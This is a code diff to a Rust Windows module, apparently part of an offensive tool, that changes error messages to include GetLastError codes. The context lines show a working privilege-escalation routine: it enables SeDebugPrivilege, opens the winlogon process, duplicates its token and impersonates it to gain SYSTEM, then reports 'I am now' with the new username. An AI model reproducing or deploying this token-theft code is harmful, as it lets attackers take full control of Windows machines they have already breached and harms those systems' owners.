@@ -37,7 +37,8 @@ fn enable_debug() -> Result<(), String> {
         ) {
             Ok(_) => {}
             Err(_) => {
-                return Err("Couldn't open process token".to_string());
+                let err = GetLastError().0;
+                return Err(format!("Couldn't open process token: {err}"));
             }
         }
 
@@ -47,7 +48,8 @@ fn enable_debug() -> Result<(), String> {
         match LookupPrivilegeValueA(PCSTR::null(), PCSTR("SeDebugPrivilege\x00".as_ptr()), &mut luid) {
             Ok(_) => {}
             Err(_) => {
-                return Err("Couldn't lookup SeDebugPrivilege".to_string());
+                let err = GetLastError().0;
+                return Err(format!("Couldn't lookup SeDebugPrivilege: {err}"));
             }
         };
         let privs = [LUID_AND_ATTRIBUTES {
@@ -69,7 +71,10 @@ fn enable_debug() -> Result<(), String> {
             None,
         ) {
             Ok(_) => Ok(()),
-            Err(_) => Err("Couldn't adjust token privileges".to_string()),
+            Err(_) => {
+                let err = GetLastError().0;
+                return Err(format!("Couldn't adjust token privileges: {err}"));
+            }
         }
     }
 }
@@ -85,7 +90,8 @@ pub fn handle() -> Result<String, String> {
         let mut duplicate_token_handle = HANDLE(0);
         let winlogon_processes = get_processes("winlogon");
         if winlogon_processes.is_empty() {
-            return Err("Couldn't find winlogon!".to_string());
+            let err = GetLastError().0;
+            return Err(format!("Couldn't find winlogon: {err}"));
         }
 
         let winlogon_pid: u32 = winlogon_processes[0].0;
@@ -101,7 +107,8 @@ pub fn handle() -> Result<String, String> {
             )
             .unwrap();
             if winlogon_token_handle.0 == 0 {
-                return Err("Couldn't get Winlogon Token!".to_string());
+                let err = GetLastError().0;
+                return Err(format!("Couldn't get Winlogon Token: {err}"));
             }
             // Duplicate Token
             DuplicateToken(
@@ -111,17 +118,19 @@ pub fn handle() -> Result<String, String> {
             )
             .unwrap();
             if duplicate_token_handle.0 == 0 {
-                return Err("Couldn't duplicate token!".to_string());
+                let err = GetLastError().0;
+                return Err(format!("Couldn't duplicate token: {err}"));
             }
             // ImpersonateLoggedOnUser
             if let Ok(_) = ImpersonateLoggedOnUser(duplicate_token_handle) {
                 CloseHandle(winlogon_proc_handle).unwrap();
                 return Ok(format!("I am now {}", whoami::username()));
             }
-            return Err("Couldn't get SYSTEM!".to_string());
+            let err = GetLastError().0;
+            return Err(format!("Couldn't get SYSTEM: {err}"));
         } else {
-            let error_code = GetLastError();
-            return Err(format!("Couldn't Open Process: {}", error_code.0));
+            let err = GetLastError();
+            return Err(format!("Couldn't Open Process: {err}"));
         }
     }
 }
